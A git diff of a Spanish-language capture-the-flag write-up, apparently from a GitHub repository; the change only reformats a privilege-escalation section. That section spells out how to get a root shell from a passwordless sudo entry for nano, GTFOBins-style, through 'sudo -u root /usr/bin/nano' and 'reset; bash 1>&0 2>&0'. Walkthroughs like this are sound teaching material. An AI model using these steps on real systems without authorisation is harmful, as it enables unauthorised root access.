@@ -120,7 +120,7 @@ Una vez conocemos el usuario y su contraseña probamos a entrar a la máquina Ca
 ## Escala de Privilegios
 
 Una vez dentro de la máquina ejecutamos `sudo -l` observamos que podemos correr `/usr/bin/nano` sin proporcionar contraseña.<br>
-`-l` ⮞ listar comandos que podemos ejecutar como sudo(sudoers).<br>
+`-l` ⮞ listar comandos que podemos ejecutar como sudo(sudoers).
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/0725a4ed-2bc2-48bd-b4c7-baa1d5d2ca64)
@@ -137,11 +137,11 @@ Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https:/
 Por lo cual para elevar privilegios lo que debemos hacer es seguir dichos pasos ejecutando los sigueintes comando en este orden: 
 <br>
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1-. sudo -u root /usr/bin/nano<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2-. CTRL + R<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3-. CTRL + X<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4-. reset; bash 1>&0 2>&0 <br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5-. CTRL + L
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1-. `sudo -u root /usr/bin/nano`<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2-. `CTRL + R`<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3-. `CTRL + X`<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4-. `reset; bash 1>&0 2>&0` <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5-. `CTRL + L`
 <br>
 
 Y listo ya somos root!
